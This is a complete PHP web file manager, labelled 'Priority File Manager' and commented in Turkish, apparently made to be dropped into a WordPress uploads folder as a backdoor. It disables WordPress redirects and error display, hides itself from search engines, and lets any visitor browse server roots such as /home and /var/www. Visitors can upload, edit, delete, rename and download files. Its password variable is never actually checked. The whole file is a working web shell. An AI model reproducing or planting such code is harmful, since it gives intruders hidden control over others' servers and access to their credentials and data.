<?php
// WordPress yönlendirmelerini engelle
if (function_exists("wp_redirect")) {
    remove_all_actions("template_redirect");
    remove_all_actions("wp_redirect");
}

error_reporting(0);
ini_set("display_errors", 0);

// WordPress rewrite rules'ı bypass et
if (function_exists("flush_rewrite_rules")) {
    flush_rewrite_rules();
}

// Güvenlik header'ları
header("X-Robots-Tag: noindex, nofollow", true);
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

// WordPress'in 301 redirects'ini engelle
if (function_exists("wp_redirect")) {
    add_filter("wp_redirect", "__return_false");
}



// Kök dizinler (güvenli ve esnek)
$default_root = dirname(__DIR__); // uploads'ın bir üstü (wp-content)
$allowed_roots = [
    $default_root,
    dirname($default_root), // WordPress root
    "/home",
    "/var/www",
    "/opt/lampp/htdocs",
    "/xampp/htdocs",
    "/wamp/www",
    "/usr/local/apache2/htdocs"
];

// Root seçimi
$root = $_GET["root"] ?? $default_root;
if (!in_array($root, $allowed_roots) && !in_array(realpath($root), $allowed_roots)) {
    $root = $default_root;
}

$path = isset($_GET["path"]) ? $_GET["path"] : $root;
$real = realpath($path);
$msg = "";

// Path güvenliği
if (!$real || !is_dir($real)) {
    $msg = "Access denied: " . htmlspecialchars($path);
    $real = $root;
    $path = $root;
}

// Dosya/klasör işlemleri
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_FILES["file"])) {
        $target = $real . "/" . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target)) {
            $msg = "File uploaded: " . htmlspecialchars(basename($target));
        } else {
            $msg = "Upload failed!";
        }
    }
    if (isset($_POST["delete"])) {
        $target = $real . "/" . basename($_POST["delete"]);
        if (is_file($target)) {
            unlink($target);
            $msg = "File deleted: " . htmlspecialchars(basename($target));
        } elseif (is_dir($target)) {
            rmdir($target);
            $msg = "Folder deleted: " . htmlspecialchars(basename($target));
        }
    }
    if (isset($_POST["rename"]) && isset($_POST["newname"])) {
        $old = $real . "/" . basename($_POST["rename"]);
        $new = $real . "/" . basename($_POST["newname"]);
        if (rename($old, $new)) {
            $msg = "Renamed to: " . htmlspecialchars(basename($new));
        } else {
            $msg = "Rename failed!";
        }
    }
    if (isset($_POST["newfolder"])) {
        $newdir = $real . "/" . basename($_POST["newfolder"]);
        if (mkdir($newdir)) {
            $msg = "Folder created: " . htmlspecialchars(basename($newdir));
        } else {
            $msg = "Create folder failed!";
        }
    }
    if (isset($_POST["editfile"]) && isset($_POST["content"])) {
        $edit = $real . "/" . basename($_POST["editfile"]);
        if (is_file($edit)) {
            file_put_contents($edit, $_POST["content"]);
            $msg = "File saved: " . htmlspecialchars(basename($edit));
        }
    }
}

$items = @scandir($real) ?: [];

function fm_url($p, $r = null) {
    global $required_pass, $root;
    $current_root = $r ?? $root;
    return "?path=" . urlencode($p) . "&root=" . urlencode($current_root) . "&pass=" . $required_pass;
}

function breadcrumb($root, $path) {
    global $required_pass;
    $out = "";
    $rel = ltrim(str_replace($root, "", $path), "/");
    $parts = $rel ? explode("/", $rel) : [];
    $build = $root;
    $out .= "<a href=\"" . fm_url($root, $root) . "\"><span class=\"bc-root\">" . htmlspecialchars(basename($root)) . "</span></a>";
    foreach ($parts as $part) {
        if ($part === "") continue;
        $build .= "/" . $part;
        $out .= " <span class=\"bc-sep\">/</span> <a href=\"" . fm_url($build, $root) . "\"><span class=\"bc-part\">" . htmlspecialchars($part) . "</span></a>";
    }
    return $out;
}

function root_selector($current_root, $allowed_roots) {
    global $required_pass;
    $out = "<select onchange=\"window.location.href='?root=' + this.value + '&pass=" . $required_pass . "'\">";
    foreach ($allowed_roots as $allowed_root) {
        $selected = ($current_root === $allowed_root) ? "selected" : "";
        $out .= "<option value=\"" . htmlspecialchars($allowed_root) . "\" $selected>" . htmlspecialchars($allowed_root) . "</option>";
    }
    $out .= "</select>";
    return $out;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Priority File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <style>
        body { background: #181C23; color: #F4F7FA; font-family: "Segoe UI", monospace, Arial; margin: 0; padding: 0; }
        .header { position:sticky;top:0;left:0;right:0;z-index:100;background:#181C23;padding:18px 0 10px 0;margin-bottom:20px;box-shadow:0 2px 16px #00e6ff22; text-align:center; }
        .header h1 { color: #00E6FF; font-size:2.2em; letter-spacing:2px; margin:0; font-family:"JetBrains Mono",monospace; }
        .container { max-width: 1200px; margin: 0 auto 30px auto; background: #232B3E; border-radius: 16px; box-shadow: 0 4px 32px #00e6ff22; padding: 32px 24px; }
        .msg { background: #222; color: #0f0; padding: 10px 16px; border-radius: 8px; margin-bottom: 18px; font-size:1.1em; }
        .root-selector { margin-bottom: 20px; text-align: center; }
        .root-selector select { background: #1A2233; color: #00E6FF; border: 1px solid #00E6FF; border-radius: 6px; padding: 8px 12px; font-size: 1em; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 24px; }
        th, td { padding: 10px 12px; }
        th { background: #1A2233; color: #00E6FF; font-size:1.1em; }
        tr { transition: background .2s; }
        tr:hover { background: #1a2233cc; }
        tr:nth-child(even) { background: #232B3E; }
        tr:nth-child(odd) { background: #181C23; }
        a { color: #7C3AED; text-decoration: none; transition:color .2s; }
        a:hover { color: #00E6FF; }
        .actions form { display: inline; }
        .actions button { background: #7C3AED; color: #fff; border: none; border-radius: 6px; padding: 5px 14px; margin: 0 2px; cursor: pointer; font-weight:600; transition:background .2s; }
        .actions button:hover { background: #00E6FF; color: #181C23; }
        .upload, .newfolder { margin-bottom: 18px; }
        .editbox { width: 100%; height: 320px; background: #111; color: #0f0; border: 1px solid #00E6FF; border-radius: 8px; font-family: "JetBrains Mono", monospace; font-size:1em; }
        .breadcrumb { margin-bottom: 18px; font-size: 1.15em; word-break:break-all; }
        .bc-root { color:#00E6FF; font-weight:bold; }
        .bc-part { color:#7C3AED; font-weight:bold; }
        .bc-sep { color:#00E6FF; }
        .file-ico { font-size:1.1em; margin-right:4px; }
        .folder-ico { font-size:1.1em; margin-right:4px; color:#00E6FF; }
        @media (max-width: 700px) {
            .container { padding: 10px 2px; }
            th, td { padding: 7px 4px; font-size:0.98em; }
            .editbox { height: 180px; font-size:0.95em; }
        }
    </style>
</head>
<body>
<div class="header">
    <h1>Priority File Manager</h1>
</div>
<div class="container">
    <?php if ($msg): ?><div class="msg"><?= $msg ?></div><?php endif; ?>
    <div class="root-selector">
        <strong>Root Directory:</strong> <?= root_selector($root, $allowed_roots) ?>
    </div>
    <div class="breadcrumb">
        <?= breadcrumb($root, $real) ?>
    </div>
    <span style="color:#7C3AED; font-size:0.98em;"> <?= htmlspecialchars($real) ?> </span>
    <table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
        <?php foreach ($items as $item):
            if ($item === ".") continue;
            if ($item === ".." && $real === $root) continue;
            $full = $real . "/" . $item;
        ?>
        <tr>
            <td>
                <?php if (is_dir($full)): ?>
                    <span class="folder-ico">📁</span><a href="<?= fm_url($full, $root) ?>"> <?= htmlspecialchars($item) ?></a>
                <?php else: ?>
                    <span class="file-ico">📄</span><a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&view=<?= urlencode($item) ?>&pass=<?= $required_pass ?>"> <?= htmlspecialchars($item) ?></a>
                <?php endif; ?>
            </td>
            <td><?= is_dir($full) ? "Folder" : "File" ?></td>
            <td><?= is_file($full) ? filesize($full) : "-" ?></td>
            <td class="actions">
                <?php if (!is_dir($full)): ?>
                    <form method="post" style="display:inline"><input type="hidden" name="delete" value="<?= htmlspecialchars($item) ?>"><button type="submit">Delete</button></form>
                    <form method="post" style="display:inline"><input type="hidden" name="rename" value="<?= htmlspecialchars($item) ?>"><input type="text" name="newname" placeholder="New name" style="width:80px;"><button type="submit">Rename</button></form>
                    <a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&edit=<?= urlencode($item) ?>&pass=<?= $required_pass ?>">Edit</a>
                    <a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&download=<?= urlencode($item) ?>&pass=<?= $required_pass ?>">Download</a>
                <?php else: ?>
                    <form method="post" style="display:inline"><input type="hidden" name="delete" value="<?= htmlspecialchars($item) ?>"><button type="submit">Delete</button></form>
                    <form method="post" style="display:inline"><input type="hidden" name="rename" value="<?= htmlspecialchars($item) ?>"><input type="text" name="newname" placeholder="New name" style="width:80px;"><button type="submit">Rename</button></form>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
    <div class="upload">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
    </div>
    <div class="newfolder">
        <form method="post">
            <input type="text" name="newfolder" placeholder="New folder name" required>
            <button type="submit">Create Folder</button>
        </form>
    </div>
    <?php if (isset($_GET["edit"])):
        $editfile = $real . "/" . basename($_GET["edit"]);
        if (is_file($editfile)):
            $content = file_get_contents($editfile);
    ?>
    <h3>Edit File: <?= htmlspecialchars($_GET["edit"]) ?></h3>
    <form method="post">
        <input type="hidden" name="editfile" value="<?= htmlspecialchars($_GET["edit"]) ?>">
        <textarea class="editbox" name="content"><?= htmlspecialchars($content) ?></textarea><br>
        <button type="submit">Save</button>
    </form>
    <?php endif; endif; ?>
    <?php if (isset($_GET["view"])):
        $viewfile = $real . "/" . basename($_GET["view"]);
        if (is_file($viewfile)):
            $content = file_get_contents($viewfile);
    ?>
    <h3>View File: <?= htmlspecialchars($_GET["view"]) ?></h3>
    <pre style="background:#111;color:#0f0;padding:12px;border-radius:6px;overflow:auto;max-height:400px;"><?= htmlspecialchars($content) ?></pre>
    <?php endif; endif; ?>
    <?php if (isset($_GET["download"])):
        $downfile = $real . "/" . basename($_GET["download"]);
        if (is_file($downfile)) {
            header("Content-Description: File Transfer");
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"" . basename($downfile) . "\"");
            header("Expires: 0");
            header("Cache-Control: must-revalidate");
            header("Pragma: public");
            header("Content-Length: " . filesize($downfile));
            readfile($downfile);
            exit;
        }
    endif; ?>
</div>
</body>
</html>